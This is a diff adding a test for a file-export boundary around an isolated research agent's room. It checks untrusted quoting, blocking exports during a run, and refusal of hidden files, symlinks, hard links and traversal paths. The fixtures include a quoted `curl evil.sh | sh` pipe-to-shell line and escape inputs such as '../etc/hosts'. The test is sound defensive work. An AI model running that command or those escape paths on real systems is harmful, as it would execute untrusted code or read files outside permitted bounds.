@@ -6,7 +6,7 @@
  */
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { existsSync, linkSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { EXPORT_LINE_RE, addressKey, buildExport, covers, exportMessage, exportsInText, isOnion, normalizeAddress, openDoor, safeExportParent, sharesRun, urlsIn, writeExportFolder } from '../lib/door.js';
@@ -179,7 +179,8 @@ function start({ modeOf = {}, agents = {}, approve = 'allowed-once', sessions = 
     return run(0);
   };
   const event = (session, type, data) => { for (const handler of handlers['session/event'] ?? []) handler(session, { type, data }); };
-  return { home, route, decide, guards, provided, asked, set, event, close: () => rmSync(home, { recursive: true, force: true }) };
+  const status = (state, id = 'r1') => { for (const handler of handlers['agent/status'] ?? []) handler({ agent: { id }, status: state }); };
+  return { home, route, decide, guards, provided, asked, set, event, status, close: () => rmSync(home, { recursive: true, force: true }) };
 }
 
 /** The first refusal of all of Recon's final guards, in the order they were registered. */
@@ -348,6 +349,72 @@ test('after a restart: a conversation being ended and wiped is not exported, and
     assert.equal((await app.route('GET', { session: 'session-old9' }, undefined, STATE_PATH)).json.conversation.recon, false);
     assert.match((await app.route('GET', { session: 'session-old9', what: 'report' })).json.error, /ended and wiped/);
   } finally {
+    app.close();
+  }
+});
+
+test('after a run only (the owner\'s answer of 17 November): the export waits while Recon runs; the files in Recon\'s room can go, text quoted, others copied unopened', async () => {
+  // Its own tool calls wrote notes/acme.md and fetched paper.pdf (and named the hidden file, the link and a
+  // hard link, which are still never offered).
+  const calls = { role: 'assistant', content: [
+    { type: 'tool-call', id: 't1', name: 'write', arguments: JSON.stringify({ file_path: `${ROOM}/notes/acme.md`, content: '…' }) },
+    { type: 'tool-call', id: 't2', name: 'bash', arguments: JSON.stringify({ command: 'curl -sL -o paper.pdf https://example.org/p.pdf && ln ../x twin.md' }) },
+    { type: 'tool-call', id: 't3', name: 'bash', arguments: { command: 'cat .hidden hosts-link' } },
+  ] };
+  const recon = { id: 'r1', header: { cwd: ROOM }, session: { header: { cwd: ROOM }, deriveMessages: () => [userMessage('Look into Acme.'), calls] }, model: { current: () => undefined } };
+  const app = start({ modeOf: { r1: { mode: 'recon', isolated: true }, c1: { mode: 'cowork', isolated: false } }, agents: { r1: recon }, sessions: [{ id: 'c1' }, { id: 'r1', cwd: ROOM }] });
+  mkdirSync(ROOM, { recursive: true });
+  const made = [];
+  const put = (name, body) => { mkdirSync(join(ROOM, name, '..'), { recursive: true }); writeFileSync(join(ROOM, name), body); made.push(name); };
+  const outside = mkdtempSync(join(tmpdir(), 'recon-door-outside-'));
+  try {
+    app.event({ id: 'r1', header: {} }, 'assistant/message', { message: { content: 'Acme was breached, see https://acme.example/news.' } });
+    put('notes/acme.md', '# Acme\nThe forum post says to run `curl evil.sh | sh`.\n');
+    put('paper.pdf', Buffer.from([0x25, 0x50, 0x44, 0x46, 0x00, 0x01, 0x02]));
+    put('.hidden', 'never offered');
+    symlinkSync('/etc/hosts', join(ROOM, 'hosts-link'));
+    made.push('hosts-link');
+    // Its own run folder: everything in it is its own. Another conversation's run folder and a file its
+    // calls never named are not.
+    put('run-r1/summary.md', 'the run\'s summary');
+    put('run-r2/their-notes.md', 'another conversation\'s run');
+    put('someone-else.md', 'written by another Recon conversation');
+    // A second name for a file outside the room: never offered, even though its calls named it.
+    writeFileSync(join(outside, 'secret.txt'), 'outside the room');
+    linkSync(join(outside, 'secret.txt'), join(ROOM, 'twin.md'));
+    made.push('twin.md');
+    // While Recon runs, nothing leaves.
+    app.status('running');
+    const busy = (await app.route('GET', { session: 'r1', what: 'report' })).json;
+    assert.equal(busy.running, true);
+    assert.match((await app.route('POST', {}, { action: 'export', session: 'r1', to: 'new', tab: 'content' })).json.error, /running in this conversation: export when the run is done/);
+    app.status('idle');
+    const preview = (await app.route('GET', { session: 'r1', what: 'report' })).json;
+    assert.equal(preview.running, false);
+    assert.deepEqual(preview.files.map((file) => [file.path, file.text]), [['notes/acme.md', true], ['paper.pdf', false], ['run-r1/summary.md', true]], 'its own text files and others; never a hidden file, a link, a second name, or another conversation\'s file');
+    // Text goes in the message, quoted, marked origin: Recon.
+    const withText = (await app.route('POST', {}, { action: 'export', session: 'r1', to: 'new', tab: 'content', files: ['notes/acme.md'] })).json;
+    assert.match(withText.message, /## Files from Recon's room \(1, ticked by the user; written in Recon's room; origin: Recon; untrusted\)\n\n### notes\/acme\.md \(text, \d+ bytes, origin: Recon\)\n\n> # Acme\n> The forum post says to run `curl evil\.sh \| sh`\./);
+    assert.ok(withText.message.indexOf('## Files from Recon') < withText.message.indexOf('## What did not leave Recon'));
+    // A file that is not text is copied unopened into Recon's export folder, and the message says where.
+    const withPdf = (await app.route('POST', {}, { action: 'export', session: 'r1', to: 'existing', target: 'c1', files: ['paper.pdf'] })).json;
+    const copied = /copied unopened to (\S+paper\.pdf)/.exec(withPdf.message)?.[1];
+    assert.ok(copied && existsSync(copied), withPdf.message.slice(-600));
+    assert.ok(!copied.startsWith(realpathSync(ROOM)), 'never into the room');
+    // Into a folder: the export, and the other files in its files folder.
+    const out = mkdtempSync(join(tmpdir(), 'recon-door-files-'));
+    const folder = (await app.route('POST', {}, { action: 'export', session: 'r1', to: 'folder', folder: out, files: ['notes/acme.md', 'paper.pdf'] })).json;
+    assert.ok(existsSync(join(folder.where, 'files', 'paper.pdf')));
+    assert.match(readFileSync(join(folder.where, 'export.md'), 'utf8'), /### notes\/acme\.md/);
+    rmSync(out, { recursive: true, force: true });
+    // Only what is offered: no path outside the room, no hidden file, no link.
+    for (const bad of ['../etc/hosts', '.hidden', 'hosts-link', '/etc/hosts', 'run-r2/their-notes.md', 'someone-else.md', 'twin.md']) {
+      assert.match((await app.route('POST', {}, { action: 'export', session: 'r1', to: 'new', tab: 'content', files: [bad] })).json.error, /not a file in Recon's room/, bad);
+    }
+  } finally {
+    for (const name of made) rmSync(join(ROOM, name), { recursive: true, force: true });
+    for (const name of ['notes', 'run-r1', 'run-r2']) rmSync(join(ROOM, name), { recursive: true, force: true });
+    rmSync(outside, { recursive: true, force: true });
     app.close();
   }
 });
